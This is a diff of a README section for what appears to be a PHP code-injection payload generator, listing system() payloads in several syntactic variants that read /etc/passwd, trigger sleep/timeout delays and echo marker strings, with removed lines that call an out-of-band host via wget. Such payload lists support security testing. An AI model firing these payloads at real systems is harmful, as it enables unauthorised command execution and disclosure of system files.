@@ -79,26 +79,21 @@ PHP Payload Mutations:
 ### Generate Payloads
 
 ```bash
-python3 generator.py php --sleep-timeout 17 --oast-domain burp-collaborator.oastify
 system("cat /etc/passwd")
 system("cat /etc/passwd");
 ;system("cat /etc/passwd");
 <?php system("cat /etc/passwd"); ?>
-system("sleep 15")
-system("sleep 15");
-;system("sleep 15");
-<?php system("sleep 15"); ?>
-system("timeout /T 15")
-system("timeout /T 15");
-;system("timeout /T 15");
-<?php system("timeout /T 15"); ?>
-system("echo GPULkqAgAWzO8OwtzYlg")
-system("echo GPULkqAgAWzO8OwtzYlg");
-;system("echo GPULkqAgAWzO8OwtzYlg");
-<?php system("echo GPULkqAgAWzO8OwtzYlg"); ?>
-system("wget http://asd.oastify/GPULkqAgAWzO8OwtzYlg")
-system("wget http://asd.oastify/GPULkqAgAWzO8OwtzYlg");
-;system("wget http://asd.oastify/GPULkqAgAWzO8OwtzYlg");
-<?php system("wget http://asd.oastify/GPULkqAgAWzO8OwtzYlg"); ?>
+system("sleep 17")
+system("sleep 17");
+;system("sleep 17");
+<?php system("sleep 17"); ?>
+system("timeout /T 17")
+system("timeout /T 17");
+;system("timeout /T 17");
+<?php system("timeout /T 17"); ?>
+system("echo PLmyJkJgSdo5iQ9lDAnH")
+system("echo PLmyJkJgSdo5iQ9lDAnH");
+;system("echo PLmyJkJgSdo5iQ9lDAnH");
+<?php system("echo PLmyJkJgSdo5iQ9lDAnH"); ?>
 [...]
 ```
